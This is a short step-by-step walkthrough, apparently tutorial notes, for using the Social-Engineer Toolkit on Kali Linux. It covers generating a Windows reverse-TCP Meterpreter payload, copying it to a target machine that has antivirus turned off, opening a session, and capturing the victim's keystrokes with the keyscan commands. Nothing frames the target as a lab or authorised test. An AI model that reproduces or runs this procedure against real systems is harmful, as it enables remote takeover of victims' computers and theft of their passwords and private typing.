1. 1) Social Engineering Attacks 

2. 4) Create a Payload and Listener
        - Payload = virus, worm, or Trojan which contains instructions on what to do on a victim’s computer.

3. 2) Windows Reverse_TCP Meterpreter

4. Enter IP Address of Host and choose Random Port

5. When hit enter, the payload will be generated and exported to SET directory at /root/.set/payload.exe

6. Right click on the payload.exe file, click on properties, on permissions make sure to check “Allow executing file as program”

7. Back at the terminal, it is prompting to start the payload. Type yes

8. Copy the payload.exe over to the target machine and make sure the target machine does not have anti-virus software running or else it will get deleted

9. Run the payload.exe on the target machine.

10. After running it, go back to the Kali Linux terminal and a session will be starting. Use “sessions -i 1” command to start interacting with the session.

11. Now that our Kali Linux have a session on the target machine, it is possible to run commands like “sysinfo”

12. Run “keyscan_start” to start collecting the target machine’s keystroke.

13. run the command “keyscan_dump” to display what the target machine have typed.

14. Stop the key scanner by running the command “keyscan_stop”
